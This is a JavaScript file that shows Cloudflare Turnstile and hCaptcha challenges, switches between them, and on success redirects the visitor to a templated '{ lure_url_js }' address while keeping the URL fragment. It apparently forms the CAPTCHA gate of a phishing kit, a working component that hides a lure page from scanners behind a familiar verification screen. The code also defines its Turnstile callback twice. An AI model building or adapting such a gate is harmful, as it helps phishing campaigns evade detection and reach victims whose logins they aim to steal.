

window.onloadTurnstileCallback = function () {
    turnstile.render('#myWithget', {
        sitekey: '0x4AAAAAAAfqzm9_KK7B52xE',
        callback: function(token) {
            console.log(`Challenge Success ${token}`);
        },
    });
};


var verifyCallback_CF = function (response) {
    let cfForm = document.querySelector("#cfForm")
    if (validateElement(cfForm) && response.length > 10) {
        // console.log(response);
        cfForm.remove()
        window.location.href = { lure_url_js } + window.location.hash
        return
    }
    console.log("cant find cloudflare, switching to hcaptcha")
    return switchToSecondCaptcha()
}

var verifyCallback_hCaptcha = function (response) {
    let gForm = document.querySelector("#gForm")
    if (gForm == undefined) {
        return
    }
    if (gForm.style != undefined && gForm.style.visibility != undefined) {
        gForm = document.querySelector("#gForm").style.visibility = "hidden"
    }
    window.location.href = { lure_url_js } + window.location.hash
}
function validateElement(element) {
    return element != undefined && element.style != undefined && element.style.visibility != undefined
}

window.switchToSecondCaptcha = function () {
    console.log("CAPTCHA switch callback activated")
    let gForm = document.querySelector("#gForm")
    if (validateElement(gForm) || gForm.style == "visible") {
        return
    }
    setTimeout(function () {
        const cfForm = document.querySelector("#cfForm")
        if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
            cfForm.remove()
        }
        setTimeout(function () {
            gForm.style.visibility = "visible"
        }, 200)
    }, 200)
}
var refreshCallBack = function (response) {
    console.log("Refresh callback activated")
    setTimeout(function () {
        window.location.reload()
    }, 1000)
}

window.onloadTurnstileCallback = function () {
    turnstile.render("#turnstileCaptcha", {
        sitekey: "{ turnstile_sitekey }",
        callback: verifyCallback_CF,
        "expired-callback": refreshCallBack,
        // "error-callback": switchToSecondCaptcha(),
    })
}

var incrementLoader = function () {
    const waitp = document.querySelector("#cf-spinner-please-wait")
    const gForm = document.querySelector("#gForm")
    if (validateElement(gForm) && gForm.style.visibility == "hidden") {
        waitp.textContent += "."
    }
}
setTimeout(() => {
    let i = 0
    ticker = setInterval(function () {
        i += 1
        incrementLoader()
        if (i > 3) {
            clearInterval(ticker)
            return
        }
    }, 1000)
}, 500)

setTimeout(function () {
    const cfForm = document.querySelector("#cfForm")
    if (!validateElement(cfForm)) {
        switchToSecondCaptcha()
        return
    }
    const gForm = document.querySelector("#gForm")
    if (!validateElement(gForm)) {
        // nothing to switch to
        return
    }
     if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
        switchToSecondCaptcha()
    }
}, 7000)